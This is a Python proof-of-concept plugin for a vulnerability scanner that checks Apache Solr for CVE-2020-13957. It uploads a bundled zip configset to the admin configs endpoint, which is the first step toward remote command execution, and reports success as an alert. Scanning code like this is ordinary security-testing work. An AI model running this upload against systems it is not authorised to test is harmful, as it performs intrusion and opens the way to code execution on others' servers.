#!/usr/bin/env python
# coding=utf-8

import os
from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    cwd = os.path.split(os.path.abspath(__file__))[0]
    jar_file_dir = os.path.join(cwd, "jarfile")
    zip_file = os.path.join(jar_file_dir, "solr_upload_rce_cve_2020_13957.zip")

    try:
        path = "/solr/admin/configs?action=UPLOAD&name=SecurityConfigSet" + random_str(10)
        url = "{}://{}:{}{}".format(service, ip, port, path)
        file_data = {'file': ("security-test.txt.zip", open(zip_file, 'rb'))}

        r = await http_client(ip, port).post(url, files=file_data, timeout=20)

        if r.status_code == 200 and r.json()['responseHeader']['status'] == 0:
            ret = {
                'alert_group': 'Solr Upload RCE CVE-2020-13957',
                'affects': '{}'.format(url),
                'details': 'through url: /solr/admin/configs?action=UPLOAD\n '
                           'can upload a zip file and execute command\n '
                           'see details: https://cert.360.cn/warning/detail?id=017b8f976fd9a6409e051ed9ef24bb67'
            }
            return ret
    except json.decoder.JSONDecodeError as e:
        pass
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8983, 'http', True, task_msg={})
    run_plugin_test(scan)
